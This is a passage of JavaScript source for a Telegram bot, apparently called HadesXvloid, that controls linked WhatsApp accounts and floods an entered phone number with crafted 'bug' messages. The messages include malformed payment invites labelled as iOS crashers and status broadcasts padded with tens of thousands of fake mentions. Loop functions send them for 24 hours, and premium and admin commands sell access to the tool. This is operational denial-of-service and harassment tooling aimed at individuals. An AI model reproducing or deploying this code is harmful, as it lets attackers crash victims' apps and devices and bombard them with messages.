    } catch (error) {
        console.error("Error Sending Bug:", error);
    }
}

async function QPayStriepCore(target) {
      await sock.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "STRIPE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function CrashIosCore(target) {
      await sock.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "CASHAPP",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }
    
async function location(target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                liveLocationMessage: {
                    degreesLatitude: 'p',
                    degreesLongitude: 'p',
                    caption: "HADESXVLOID #ArgaOfficial🥵",
                    sequenceNumber: '0',
                    jpegThumbnail: '',
                    contextInfo: {
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1000 * 40 },
                                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                            ),
                        ],
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: false
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: target
                    },
                    content: undefined
                }]
            }]
        }]
    });
}
    
async function delayonly(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 2000) {
            await Promise.all([
            location(target, false), 
            TrashProtocol(target, false),
            invisfc(target, false), 
            protocolbug7(target, false), 
            GhostSqL(target, false),            
            ]);
            console.log(chalk.red(`Sending ( DelayInvisible Hard🦠) ${count}/2000 to ${target}`));
            count++;
            setTimeout(sendNext, 3000);
        } else {
            console.log(chalk.green(`✅ Success Sending 2000 Messages to ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 2000 Messages"));
            setTimeout(sendNext, 2000);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 2000);
    }
};

sendNext();

}

async function systemuiikil(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 200) {
            await Promise.all([
            LocaBugs(target, false),
            invcbloob(target),
            invcbloob(target, false),            
            ]);
            console.log(chalk.red(`Sending ( Crash SystemUi🦠) ${count}/200 to ${target}`));
            count++;
            setTimeout(sendNext, 1000);
        } else {
            console.log(chalk.green(`✅ Success Sending 400 Messages to ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 400 Messages"));
            setTimeout(sendNext, 1000);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 1000);
    }
};

sendNext();

}

async function froclose(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 800) {
            await Promise.all([
            ForceXsystem(target, false),
            ForceXsystem(target, true),
            ForceXsystem(target, false),             
            ]);
            console.log(chalk.red(`Sending ( Crash Infinity🦠) ${count}/800 to ${target}`));
            count++;
            setTimeout(sendNext, 3000);
        } else {
            console.log(chalk.green(`✅ Success Sending 400 Messages to ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 400 Messages"));
            setTimeout(sendNext, 3000);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 1000);
    }
};

sendNext();

}

async function aiphoneampas(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 800) {
            await Promise.all([
            CrashIp(target, false),
            QPayStriepCore(target, true),
            CrashIosCoretem(target, false), 
            
            ]);
            console.log(chalk.red(`Sending ( Crash Ios🦠) ${count}/800 to ${target}`));
            count++;
            setTimeout(sendNext, 1000);
        } else {
            console.log(chalk.green(`✅ Success Sending 400 Messages to ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 400 Messages"));
            setTimeout(sendNext, 1000);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 1000);
    }
};

sendNext();

}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}


const bugRequests = {};
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`Akses Ditolak❗\`\`\`
Tidak ada akses, Silahkan menggunakan cmd /addprem idlu
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝐎͢𝐰͡𝐧͜𝐞͢𝐫", url: "t.me/ArgaOffc" }]]
      }
    });
  }

  bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`
╭─────( 🎭⃟༑⌁⭚𝗛͍𝗮𝗱𝗲͢𝐬-𝙓𝙫͋𝙡𝙤𝙞𝙙ཀ͒͜͡ )─────────╮
│友 ɴᴀᴍᴇ ʙᴏᴛ : HadesXvloid
│友 ᴠᴇʀsɪᴏɴ : 1.4 Free
│友 ᴅᴇᴠᴇʟᴏᴘᴇʀ  : @ArgaOffc
│友 ɪɴғᴏʀᴍᴀᴛɪᴏɴ : t.me/frefuncarga
╰─────────────────────╯
╭────────( 𝙐𝙨𝙚𝙧 )────────╮
│⻆ ᴜsᴇʀ : ${username}
╰─────────────────────╯
╭─────( 𝗠𝗲𝗻𝘂 𝗖𝗼𝗻𝘁𝗿𝗼𝗹𝗹 )──────╮
│⻤ /addprem
│⻤ /delprem
│⻤ /listprem
│⻤ /setjeda
│⻤ /addadmin
│⻤ /deladmin
│⻤ /addsender
╰──────────────────────╯
INFORMATION : https://whatsapp.com/channel/0029Vay4hgh2Jl8J4yIOIA3i
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐓͢𝐡͡𝐚͜𝐧͢𝐤⍣᳟𝐬꙳͙͡", callback_data: "thanksto" }, { text: "𝐎͢𝐰͡𝐧͜𝐞͢𝐫", url: "t.me/ArgaOffc" }],
        [{ text: "𝐁͢𝐮͡𝐠⍣᳟𝐌͢𝐞͡𝐧͜𝐮꙳͙͡", callback_data: "xylent-crash" }]
      ]
    }
  });
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const senderId = query.from.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const randomImage = getRandomImage();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "xylent-crash") {
      caption = `\`\`\`
╭─────( 🎭⃟༑⌁⭚𝗛͍𝗮𝗱𝗲͢𝐬-𝙓𝙫͋𝙡𝙤𝙞𝙙ཀ͜͡ )─────────╮
│友 ɴᴀᴍᴇ ʙᴏᴛ : Hdxv
│友 ᴠᴇʀsɪᴏɴ : 1.4 free
│友 ᴅᴇᴠᴇʟᴏᴘᴇʀ  : @ArgaOffc
│友 ɪɴғᴏʀᴍᴀᴛɪᴏɴ : t.me/frefuncarga
╰─────────────────────╯
╭────────( 𝙐𝙨𝙚𝙧 )────────╮
│⻆ ᴜsᴇʀ : ${username}
╰─────────────────────╯

┏━━[ 𐂡 ] ⌠ 🎭⃟༑⌁⭚𝗛͍𝗮𝗱𝗲͢𝐬-𝙓𝙫͋𝙡𝙤𝙞𝙙ཀ͜͡ ⌡
┃
┃✧ /OverFlow 628xxx
┃     ├╼⟡ ForceUi
┃     ├╼⟡ Spam Bug
┃
┃✧ /EchoInvis 628xxx
┃     ├╼⟡ DelayInvisible
┃     └╼⟡ Tag Sw spm
┃
┃✧ /Hextrash 628xxx
┃     ├╼⟡ SystemUi
┃     └╼⟡ SpamBug
┃
┃✧ /Vanisher 628xxx
┃     ├╼⟡ Forclose Ios
┃     └╼⟡ SpamBug
┗━━━━━━━━━━━━━━━━━━━━❍
 © 𝙷𝚊𝚍𝚎𝚜𝚡𝚟𝚕𝚘𝚒𝚍⚡
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "༑𝐌͢𝐚͡𝐢͜𝐧⍣᳟𝐌͢𝐞͡𝐧͜𝐮", callback_data: "back_to_main" }]] };
    }

    if (query.data === "thanksto") {
      caption = `\`\`\`
╭─────( 🎭⃟༑⌁⭚𝗛͍𝗮𝗱𝗲͢𝐬-𝙓𝙫͋𝙡𝙤𝙞𝙙ཀ͜͡ )─────────╮
│友 ɴᴀᴍᴇ ʙᴏᴛ : Hdxv
│友 ᴠᴇʀsɪᴏɴ : 1.4 fre
│友 ᴅᴇᴠᴇʟᴏᴘᴇʀ  : @ArgaOffc
│友 ɪɴғᴏʀᴍᴀᴛɪᴏɴ : t.me/frefuncarga
╰─────────────────────╯
╭───────( 𝙐𝙨𝙚𝙧 )─────────╮
│⻆ ᴜsᴇʀ : ${username}
╰─────────────────────╯
╭─────( 𝗧𝗾𝘁𝗼 )──────╮
│⻤ AllahSwt - Mygod
│⻤ MyFamiliy - Support
│⻤ ArgaOffc - Creator
│⻤ Sanzy - Support
│⻤ Fanz - Support
│⻤ Zar - Support
│⻤ Bagus - Support
╰────────────────────╯
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "༑𝐌͢𝐚͡𝐢͜𝐧⍣᳟𝐌͢𝐞͡𝐧͜𝐮", callback_data: "back_to_main" }]] };
    }

    if (query.data === "back_to_main") {
      caption = `\`\`\`
╭─────(  🎭⃟༑⌁⭚𝗛͍𝗮𝗱𝗲͢𝐬-𝙓𝙫͋𝙡𝙤𝙞𝙙ཀ͒͜͡ )─────────╮
│友 ɴᴀᴍᴇ ʙᴏᴛ : Hdxv
│友 ᴠᴇʀsɪᴏɴ : 1.4 fre
│友 ᴅᴇᴠᴇʟᴏᴘᴇʀ  : @ArgaOffc
│友 ʀᴜɴᴛɪᴍᴇ ᴘᴀɴᴇʟ :  ${runtime}
│友 ɪɴғᴏʀᴍᴀᴛɪᴏɴ : t.me/frefuncarga
╰─────────────────────╯
╭───────( 𝙐𝙨𝙚𝙧 )────────╮
│⻆ ᴜsᴇʀ : ${username}
╰─────────────────────╯
╭─────( 𝘾𝙤𝙣𝙩𝙧𝙤𝙡 𝙈𝙚𝙣𝙪 )──────╮
│⻤ /addprem
│⻤ /delprem
│⻤ /listprem
│⻤ /setjeda
│⻤ /addadmin
│⻤ /deladmin
│⻤ /addsender
╰──────────────────────╯
\`\`\``;
      replyMarkup = {
        inline_keyboard: [
          [{ text: "𝐓͢𝐡͡𝐚͜𝐧͢𝐤⍣᳟𝐬꙳͙͡", callback_data: "thanksto" }, { text: "𝐎͢𝐰͡𝐧͜𝐞͢𝐫", url: "t.me/ArgaOffc" }],
          [{ text: "𝐁͢𝐮͡𝐠⍣᳟𝐌͢𝐞͡𝐧͜𝐮꙳͙͡", callback_data: "xylent-crash" }]
        ]
      };
    }

    await bot.editMessageMedia(
      {
        type: "photo",
        media: randomImage,
        caption: caption,
        parse_mode: "Markdown"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});

//=======CASE BUG=========//
bot.onText(/\/OverFlow (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `lu ngapain mending join sini t.me/frefuncarga`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐎͢𝐰͡𝐧͜𝐞͢𝐫", url: "https://t.me/ArgaOffc" }]
        ]
      }
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx");
    }

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/4aiow4.png", {
      caption: `
\`\`\`
╭━━━━━──━━━━━
┃「 🎭⃟༑⌁⭚𝗛͍𝗮𝗱𝗲͢𝐬-𝙓𝙫͋𝙡𝙤𝙞𝙙ཀ͜͡ 」
┣━━━━━──━━━━━
┃Target :  ${formattedNumber}
┃Status : Proses ⏳
╰━━━━━──━━━━━
\`\`\`
      `,
      parse_mode: "Markdown"
    });

    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    await froclose(24, jid); 
    
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `
\`\`\`
╭━━━━━──━━━━━
┃「 🎭⃟༑⌁⭚𝗛͍𝗮𝗱𝗲͢𝐬-𝙓𝙫͋𝙡𝙤𝙞𝙙ཀ͜͡ 」
┣━━━━━──━━━━━
┃Target :  ${formattedNumber}
┃Status : Succes ✅
╰━━━━━──━━━━━
\`\`\`
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝙎𝙐𝘾𝘾𝙀𝙎 𝙎𝙀𝙉𝘿𝙄𝙉𝙂 𝘽𝙐𝙂 🚀", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/EchoInvis (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `lu ngapain mending join sini t.me/information_xylent`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐎͢𝐰͡𝐧͜𝐞͢𝐫", url: "https://t.me/ArgaOffc" }]
        ]
      }
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx");
    }

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/4aiow4.png", {
      caption: `
\`\`\`
╭━━━━━──━━━━━
┃「 🎭⃟༑⌁⭚𝗛͍𝗮𝗱𝗲͢𝐬-𝙓𝙫͋𝙡𝙤𝙞𝙙ཀ͜͡ 」
┣━━━━━──━━━━━
┃Target :  ${formattedNumber}
┃Status : Proses ⏳
╰━━━━━──━━━━━
\`\`\`
      `,
      parse_mode: "Markdown"
    });

    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await delayonly(24, jid);

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `
\`\`\`
╭━━━━━──━━━━━
┃「 🎭⃟༑⌁⭚𝗛͍𝗮𝗱𝗲͢𝐬-𝙓𝙫͋𝙡𝙤𝙞𝙙ཀ͜͡ 」
┣━━━━━──━━━━━
┃Target :  ${formattedNumber}
┃Status : Succes ✅
╰━━━━━──━━━━━
\`\`\`
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝙎𝙐𝘾𝘾𝙀𝙎 𝙎𝙀𝙉𝘿𝙄𝙉𝙂 𝘽𝙐𝙂 🚀", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});



  bot.onText(/\/Hextrash (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `lu ngapain mending join sini t.me/information_xylent`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐎͢𝐰͡𝐧͜𝐞͢𝐫", url: "https://t.me/ArgaOffc" }]
        ]
      }
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx");
    }

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/4aiow4.png", {
      caption: `
\`\`\`
╭━━━━━──━━━━━
┃「 🎭⃟༑⌁⭚𝗛͍𝗮𝗱𝗲͢𝐬-𝙓𝙫͋𝙡𝙤𝙞𝙙ཀ͜͡ 」
┣━━━━━──━━━━━
┃Target :  ${formattedNumber}
┃Status : Proses ⏳
╰━━━━━──━━━━━
\`\`\`
      `,
      parse_mode: "Markdown"
    });

    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    await systemuiikil(24, jid); // delay 24 detik atau sesuai definisi kamu

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `
\`\`\`
╭━━━━━──━━━━━
┃「 🎭⃟༑⌁⭚𝗛͍𝗮𝗱𝗲͢𝐬-𝙓𝙫͋𝙡𝙤𝙞𝙙ཀ͜͡ 」
┣━━━━━──━━━━━
┃Target :  ${formattedNumber}
┃Status : Succes ✅
╰━━━━━──━━━━━
\`\`\`
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝙎𝙐𝘾𝘾𝙀𝙎 𝙎𝙀𝙉𝘿𝙄𝙉𝙂 𝘽𝙐𝙂 🚀", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/Vanisher (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `lu ngapain mending join sini t.me/information_xylent`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐎͢𝐰͡𝐧͜𝐞͢𝐫", url: "https://t.me/ArgaOffc" }]
        ]
      }
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx");
    }

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/4aiow4.png", {
      caption: `
\`\`\`
╭━━━━━──━━━━━
┃「 🎭⃟༑⌁⭚𝗛͍𝗮𝗱𝗲͢𝐬-𝙓𝙫͋𝙡𝙤𝙞𝙙ཀ͜͡ 」
┣━━━━━──━━━━━
┃Target :  ${formattedNumber}
┃Status : Proses ⏳
╰━━━━━──━━━━━
\`\`\`
      `,
      parse_mode: "Markdown"
    });

    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    await aiphoneampas(24, jid); 

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `
\`\`\`
╭━━━━━──━━━━━
┃「 🎭⃟༑⌁⭚𝗛͍𝗮𝗱𝗲͢𝐬-𝙓𝙫͋𝙡𝙤𝙞𝙙ཀ͜͡ 」
┣━━━━━──━━━━━
┃Target :  ${formattedNumber}
┃Status : Succes ✅
╰━━━━━──━━━━━
\`\`\`
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝙎𝙐𝘾𝘾𝙀𝙎 𝙎𝙀𝙉𝘿𝙄𝙉𝙂 𝘽𝙐𝙂 🚀", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});





//=======plugins=======//
bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});



const moment = require('moment');

bot.onText(/\/setcd (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to view the premium list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```ＬＩＳＴ ＰＲＥＭＩＵＭ\n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});